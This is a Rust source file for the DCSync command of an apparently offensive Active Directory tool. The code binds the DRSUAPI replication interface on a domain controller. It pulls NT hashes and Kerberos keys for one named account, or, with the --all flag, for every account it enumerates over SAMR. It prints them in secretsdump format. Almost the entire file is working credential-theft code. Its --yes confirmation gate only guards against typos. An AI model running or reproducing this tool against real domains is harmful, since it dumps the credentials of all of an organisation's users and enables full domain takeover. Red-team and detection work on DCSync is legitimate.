//! DCSync: replicate a target's secrets over DRSUAPI on a sealed RPC channel.
//! Supports single-target replication and full-domain dumps (enumerates all
//! accounts via SAMR, then replicates each — safety-gated by `--yes` when
//! stdout is a TTY).

use anyhow::Result;
use clap::Parser;

#[derive(Parser)]
pub(crate) struct DcsyncArgs {
    #[command(flatten)]
    pub auth: crate::shared_args::SmbAuth,
    /// Target account to replicate (sAMAccountName or DN); omit to just test the bind
    #[arg(long)]
    pub target: Option<String>,
    /// Replicate ALL domain accounts (enumerate via SAMR, then DCSync each) — full secretsdump
    #[arg(long)]
    pub all: bool,
    /// Confirm bulk (`--all`) runs non-interactively. Required when stdout is a TTY
    /// and `--all` is set; ignored otherwise. Blocks accidental full-domain dumps from
    /// a fat-fingered flag.
    #[arg(long)]
    pub yes: bool,
    /// Cap the bulk (`--all`) run at N accounts. Useful for smoke-testing --all against a
    /// large domain before committing to a full dump.
    #[arg(long)]
    pub limit: Option<usize>,
}

/// DCSync: bind DRSUAPI over a sign+sealed channel, then replicate a target's secrets.
pub(crate) async fn dcsync(mut a: DcsyncArgs) -> Result<()> {
    a.auth.password = crate::resolve_secret(&a.auth.password, "ADHAMMER_PASSWORD")?;
    use ms_drsr::DrsSession;

    if a.all {
        return dcsync_all(&a).await;
    }
    let mut sess =
        DrsSession::bind(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password).await?;
    match a.target {
        None => {
            let handle_hex: String = sess.handle().iter().map(|b| format!("{b:02x}")).collect();
            println!("[+] DRSBind OK — sealed replication handle {handle_hex} (no --target: bind-only check)");
        }
        Some(t) => {
            let (rid, nt, kerb) = sess.dcsync(&a.auth.domain, &t).await?;
            let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
            // secretsdump format: user:rid:lmhash:nthash:::  (LM is the empty-string hash)
            println!(
                "{}:{}:aad3b435b51404eeaad3b435b51404ee:{}:::",
                t, rid, nthex
            );
            // Kerberos keys (secretsdump-style): user:etype:hexkey
            for k in &kerb {
                println!("{}:{}:{}", t, k.etype_name(), hex::encode(&k.key));
            }
        }
    }
    Ok(())
}

/// Full-domain DCSync: enumerate every account over SAMR, then replicate + decrypt each —
/// whole-domain NTDS dump (secretsdump `@dc`). Reuses SAMR enumeration and per-account DCSync
/// (which now reassembles multi-fragment replies, so large/computer accounts work too).
async fn dcsync_all(a: &DcsyncArgs) -> Result<()> {
    use dcerpc::samr::SamrClient;
    use ms_drsr::DrsSession;
    use smb2_client::SmbClient;

    // 1. enumerate accounts via SAMR-over-SMB.
    let mut smb = SmbClient::connect(&a.auth.host).await?;
    smb.login(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password)
        .await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.auth.host))
        .await?;
    let pipe = smb.open_pipe("samr").await?;
    let mut samr = SamrClient::bind(&mut smb, pipe).await?;
    let mut users = samr
        .enumerate_all_users(&format!("\\\\{}", a.auth.host))
        .await?;

    // Interactive-terminal safety gate. `--all` on a fat-fingered command dumps
    // every account in the domain; require --yes when we can see the operator's
    // TTY. Non-TTY callers (CI / piped runs) bypass the prompt.
    use std::io::IsTerminal as _;
    if !a.yes && std::io::stdout().is_terminal() {
        anyhow::bail!(
            "`--all` will DCSync {} accounts from {} in this domain. Re-run with --yes to \
             confirm, or use --limit N for a scoped run first.",
            users.len(),
            a.auth.host
        );
    }

    if let Some(n) = a.limit {
        if users.len() > n {
            eprintln!(
                "[*] --limit {n} — capping bulk run at {n} of {} enumerated accounts",
                users.len()
            );
            users.truncate(n);
        }
    }

    eprintln!("[+] {} accounts scheduled for replication…", users.len());

    // 2. DCSync each over one sealed DRSUAPI session.
    let mut sess =
        DrsSession::bind(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password).await?;
    let (mut ok, mut fail) = (0u32, 0u32);
    for (_rid, name) in &users {
        match sess.dcsync(&a.auth.domain, name).await {
            Ok((rid, nt, kerb)) => {
                let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
                println!(
                    "{}:{}:aad3b435b51404eeaad3b435b51404ee:{}:::",
                    name, rid, nthex
                );
                for k in &kerb {
                    println!("{}:{}:{}", name, k.etype_name(), hex::encode(&k.key));
                }
                ok += 1;
            }
            Err(e) => {
                tracing::warn!("dcsync {name} failed: {e}");
                fail += 1;
            }
        }
    }
    eprintln!("[+] full-domain DCSync complete: {ok} dumped, {fail} failed");
    Ok(())
}
